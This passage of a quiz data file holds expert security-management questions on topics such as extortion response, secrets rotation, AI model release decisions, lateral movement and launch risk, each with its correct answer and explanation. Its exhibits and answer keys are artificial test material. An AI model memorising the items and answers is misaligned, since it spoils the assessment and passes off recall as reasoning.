    id: 288, rank: 4, topic: "Legacy ERP Risk Options", difficulty: "EXPERT",
    exhibit: "RISK: legacy ERP (end of life) with internet-facing portal. Likelihood: high. Impact: £4m.\nOPTION 1: replace ERP, £2.5m, 18 months\nOPTION 2: WAF, segmentation and monitoring, £300k, 3 months (likelihood falls to medium)\nOPTION 3: cyber insurance, £120k a year (excludes unpatched systems)",
    q: "What is the BEST recommendation to the board?",
    options: ["Accept the risk and wait until the replacement budget has been approved","Apply the interim controls now and fund the replacement on a roadmap","Fund the replacement as the single action and add interim controls only if it is delayed","Buy the insurance policy and treat the risk as fully transferred"],
    correct: 1, why: "Replacing the ERP is the right long-term answer, but it leaves the exposure unaddressed for 18 months. Interim controls reduce likelihood now at modest cost. The insurance excludes unpatched systems, so it does not transfer this risk.",
    hint: "Fix the long-term problem, but do not leave the short-term one open."
  },
  {
    id: 289, rank: 4, topic: "Data Extortion Response", difficulty: "EXPERT",
    exhibit: "FROM: Data Broker <x7q2@anon-mail.example>\nSUBJECT: Your customer database\n\nWe hold your customer database. Pay 20 BTC within 72 hours or we publish it. Proof attached: 50 records.\n\nATTACHMENT: sample_50.csv",
    q: "What is the BEST first step after receiving this extortion email?",
    options: ["Pay quickly to avoid publication of the data and the reputational damage that would follow","Ignore the message because it is probably a bluff","Verify the sample against your data and escalate to the crisis team and legal counsel","Start the incident process: verify the sample, preserve evidence, close the access path and involve legal and law enforcement"],
    correct: 3, why: "Verifying the sample and escalating are both right, but the extortion claim implies an unknown access path that may still be open. The full incident process also preserves evidence and engages law enforcement.",
    hint: "Verification is a step, not the whole response."
  },
  {
    id: 290, rank: 4, topic: "Evidence for the Regulator", difficulty: "EXPERT",
    q: "A regulator asks for evidence that the incident response plan was exercised in the last 12 months. The last scheduled exercise was 14 months ago, but a real incident 5 months ago triggered the plan and has a documented review. What is the BEST response?",
    options: ["Offer the real-incident review as evidence, say no exercise was held, and schedule one","Provide the record of the exercise held 14 months ago, explain the gap and commit to a date for the next one","State that an exercise was held within the requested period without going into the exact dates involved","Run a quick tabletop exercise now and date the report so that it falls inside the requested period"],
    correct: 0, why: "Providing the old record honestly is acceptable, but the real incident shows the plan working in practice. Being clear that no scheduled exercise occurred while offering that evidence and a date is accurate and the strongest response.",
    hint: "Be accurate, and offer the strongest honest evidence you have."
  },
  {
    id: 291, rank: 4, topic: "Secrets Sprawl Programme", difficulty: "EXPERT",
    exhibit: "SECRET SCAN RESULTS\nREPOSITORIES SCANNED: 900\nSECRETS FOUND: 4,000 (cloud keys 310, database passwords 1,150, API tokens 2,540)\nFOUND IN GIT HISTORY ONLY: 1,700\nCONFIRMED ACTIVE: 640",
    q: "What is the BEST programme response to these scan results?",
    options: ["Delete the secrets from the latest commit of each repository","Rotate the highest-risk secrets first and enable pre-commit scanning in the main repositories","Rotate exposed secrets by risk, remove them, add scanning and move to a secrets manager","Rewrite the git history to remove the secrets and consider the matter closed"],
    correct: 2, why: "Rotating the highest-risk secrets first and adding pre-commit scanning is sound, but it leaves the other secrets and the root cause. A complete programme rotates by risk, removes the secrets, adds scanning and moves them to a secrets manager.",
    hint: "Treat the cause as well as the exposed secrets."
  },
  {
    id: 292, rank: 4, topic: "Model Release Decision", difficulty: "EXPERT",
    exhibit: "MODEL RELEASE REVIEW\nMODEL v2 vs v1: task accuracy +4%\nRED-TEAM JAILBREAK SUCCESS: 2% -> 11%\nPLANNED USE: customer support assistant with a refund tool\nRELEASE DATE: next week",
    q: "What is the BEST release decision for model v2?",
    options: ["Ship it as planned because the 4% accuracy improvement matters more than the red-team results","Hold the full rollout, strengthen filters and permissions, retest and set release criteria","Release it only to low-risk use cases, with close monitoring, while the weaknesses are being fixed","Cancel all use of AI across the organisation"],
    correct: 1, why: "A limited release to low-risk uses with monitoring is a defensible compromise, but this model has a refund tool, and the jailbreak rate has risen more than fivefold. The risk should be reduced and retested before wider release.",
    hint: "The planned use has a tool that can move money."
  },
  {
    id: 293, rank: 4, topic: "Red Team Exercise Control", difficulty: "EXPERT",
    q: "During a red team exercise, the blue team detects the activity on day 1 and starts containing it. The red team asks to carry on to test later phases. What is the BEST action for the exercise control group?",
    options: ["Let the red team ignore the containment and carry on exactly as originally planned","Declare the exercise a failure for the red team and cancel the debrief with both teams","End the exercise and record the day-1 detection as a success, deferring the later phases","Honour the containment and restart later phases from an agreed foothold"],
    correct: 3, why: "Ending the exercise and recording the detection is reasonable, but it loses the chance to test later detection and response. Honouring the real containment and resuming from an agreed foothold keeps the exercise valuable.",
    hint: "The blue team's containment is real; the later phases can still be tested."
  },
  {
    id: 294, rank: 4, topic: "Budget Reduction Planning", difficulty: "EXPERT",
    q: "The CFO requires a 20% cut to the security budget. What is the BEST approach?",
    options: ["Rank spend by risk reduction, protect critical controls and show the board the residual risk change","Cut every team's budget by the same percentage","Cut only penetration testing and awareness training","Consolidate overlapping tools and cut licences with low utilisation before touching any control, and report the savings"],
    correct: 0, why: "Consolidating tools and cutting unused licences is sensible and should be part of the plan, but the board needs to understand how the cut changes residual risk so that it can make an informed decision.",
    hint: "The board is deciding on risk, not just on cost."
  },
  {
    id: 295, rank: 4, topic: "Encrypted DNS Visibility", difficulty: "EXPERT",
    exhibit: "PROXY LOG SUMMARY (24 h)\n1,200 endpoints connecting to dns.public-resolver.example:443 (DNS over HTTPS)\nINTERNAL DNS QUERY VOLUME: down 38% since the browser update\nSIEM DNS DETECTIONS AFFECTED: 14 rules",
    q: "What is the BEST way to restore DNS visibility?",
    options: ["Block all HTTPS from endpoints until the problem is fixed","Block known public DoH endpoints at egress, run a logged internal resolver and enforce it by endpoint policy","Set browser policy to use the internal resolver and disable built-in DoH","Accept the loss of DNS visibility because the traffic is encrypted"],
    correct: 1, why: "Browser policy is an effective step, but it only covers managed browsers. Blocking known public DoH endpoints, providing a logged internal resolver and enforcing it on endpoints covers the gaps.",
    hint: "Policy covers the browsers you manage; what about the rest?"
  },
  {
    id: 296, rank: 4, topic: "Regional Cloud Outage Decision", difficulty: "EXPERT",
    exhibit: "CLOUD STATUS\nPRIMARY REGION: provider outage, estimated 6+ hours\nBUSINESS RTO: 4 hours; RPO: 15 minutes\nSECONDARY REGION: replication current (lag 2 minutes); failover never tested for this workload",
    q: "What is the BEST action for the incident commander?",
    options: ["Wait for the provider to restore the region because failover has never been tested for this workload","Fail over to the secondary region after checking that replication is current and stakeholders are told","Rebuild the whole service on premises using the last weekly backup of the data","Invoke the DR plan: fail over by runbook with business approval and clear communication"],
    correct: 3, why: "Failing over after checking replication is a sound technical step, but it should be done under the DR plan, with business approval, a runbook and communication, particularly as the failover is untested.",
    hint: "The technical action is right; what governs it?"
  },
  {
    id: 297, rank: 4, topic: "Departing Administrator", difficulty: "EXPERT",
    q: "A senior cloud administrator resigns and will work a two-week notice period. They hold break-glass access and know the service-account passwords. What is the BEST approach?",
    options: ["Revoke all of their access immediately and escort them out of the building the same day","Leave their access unchanged until the final day of the notice period to avoid friction","Reduce access to their duties, rotate secrets they know, monitor, revoke on exit","Ask them to sign a written statement promising that they will not misuse any access they still hold"],
    correct: 2, why: "Immediate revocation is justified if there are risk indicators, but a routine resignation calls for a proportionate approach: reduce access, rotate what they know, monitor, and revoke fully at exit.",
    hint: "Be proportionate: the person is leaving, not under suspicion."
  },
  {
    id: 298, rank: 4, topic: "Lateral Movement Response", difficulty: "EXPERT",
    exhibit: "EDR TELEMETRY (2 hours)\nBINARY: updater.exe (unsigned, same hash on 7 hosts)\nPARENT PROCESS: wmiprvse.exe\nREMOTE EXECUTION SOURCE: admin workstation ADM-03\nTARGETS: 7 servers in the finance VLAN",
    q: "What is the BEST response to this telemetry?",
    options: ["Treat ADM-03 as the probable source: isolate it and the 7 hosts, preserve evidence, reset privileged credentials and hunt estate-wide","Isolate the seven servers and keep watching ADM-03 for further activity","Quarantine the binary on all hosts and close the alert","Wait for the antivirus vendor to release a signature for the file"],
    correct: 0, why: "Isolating the seven servers is necessary, but the common remote execution source suggests that ADM-03 or its credentials are compromised and further hosts may be affected.",
    hint: "Where did the execution come from?"
  },
  {
    id: 299, rank: 4, topic: "Reachability-Based Patching", difficulty: "EXPERT",
    exhibit: "SCAN SUMMARY\nVULNERABILITY: critical (CVSS 9.8) in library libparse 2.3\nSERVICES INCLUDING THE LIBRARY: 120\nREACHABILITY ANALYSIS: vulnerable function called by 4 services; 116 only include the library",
    q: "What is the BEST remediation plan for this library vulnerability?",
    options: ["Patch all 120 services immediately in one emergency change, whatever the disruption to the business","Fix the four reachable services first and upgrade the remaining services on the normal cadence","Ignore the finding because most of the services never call the vulnerable function","Remove the library from the SBOM so that it no longer appears in reports"],
    correct: 1, why: "Patching all 120 services at once is safe from a security perspective but needlessly disruptive. Prioritising the four reachable services and tracking the rest balances risk and operational stability.",
    hint: "Does every service face the same risk?"
  },
  {
    id: 300, rank: 4, topic: "Launch Risk Decision", difficulty: "EXPERT",
    exhibit: "PENETRATION TEST SUMMARY (new payments feature)\nHIGH: IDOR exposing other customers' invoices\nHIGH: missing rate limiting on the card-validation endpoint\nLAUNCH: next Friday (major customer demo)\nBUSINESS OWNER: wants to launch on time",
    q: "What is the BEST course of action for the CISO regarding the launch?",
    options: ["Block the launch outright because high-severity findings must never be shipped under any circumstances","Allow the launch and record nothing","Offer a limited release behind a feature flag with compensating controls in place","Present options and risks and get a documented decision from the accountable executive"],
    correct: 3, why: "A limited release with compensating controls may be one of the options, but the decision to accept the risk belongs to the accountable business executive, so options and risks should be presented and the decision documented.",
    hint: "Who owns the risk decision?"
  }
];
